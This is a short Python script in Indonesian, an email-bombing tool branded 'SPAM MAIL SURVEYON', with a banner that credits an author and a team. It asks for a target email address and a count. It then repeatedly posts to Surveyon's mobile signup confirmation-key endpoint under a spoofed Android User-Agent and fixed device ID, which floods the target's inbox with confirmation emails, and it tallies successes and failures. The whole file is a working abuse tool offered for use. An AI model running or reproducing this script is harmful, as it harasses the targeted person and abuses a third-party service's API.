try:
	import os, time, requests, sys, json
except ModuleNotFoundError:
	print("""\033[1;31m
Sepertinya module requests BELUM Di Install
$ pip install requests\n""")
	exit()
cy=('\033[1;36m')
rd=('\033[1;31m')
gr=('\033[1;32m')
wt=('\033[1;37m')
c=int(0)
scs=int(0)
fail=int(0)
banner=("""%s
			 SPAM MAIL SURVEYON%s
 ,_     _‚
 |\\\___//|	%sAuthor: KANG-NEWBIE%s
 |=6   6=|	%sContact: https://t.me/kang_nuubi%s
 \=._Y_.=/	%sGithub: https://github.com/KANG-NEWBIE%s
  )  `  (    ,	%sTEAM: CRABS (t.me/CRABS_ID)%s
 /       \  ((
 |       |   ))
/| |   | |\_//
\| |._.| |/-`
 '"'   '"'
"""%(cy,rd,gr,rd,gr,rd,gr,rd,gr,rd))

os.system('clear')
print(banner)
try:
	mail=input("%sEmail Target =>%s "%(cy,wt))
	asu=input("%sJumlah Spam =>%s  "%(cy,wt))
	while (c < int(asu)):
		s='200'
		d=({'email':mail,
			'device_id':'6bb443543d62ab32'})
		u=({'User-Agent':'surveyon/2.0.3 (Android: 6.0.1; MODEL:ASUS_X00AD; PRODUCT:WW_Phone; MANUFACTURER:asus;)'})
		r=requests.post('https://www.surveyon.com/surveyon_api/mobile/v1_1/signup/confirmation_key',data=json.dumps(d), headers=u)
		if str(s) in str(r.text):
			scs+=1
			print("%s[+] SUKSES"%(gr))
		else:
			fail+=1
			print("%s[-] GAGAL"%(rd))

		sys.stdout.flush()
		os.popen('sleep 1')
		c+=1

except:
	print("%sn[!] ERROR: Priksa email target atau koneksi internet anda"%(rd))
sukses=str(scs)
gagal=str(fail)
print("%sJumlah => %sSUKSES [%s] %sGAGAL [%s]\n"%(cy,gr,sukses,rd,gagal))
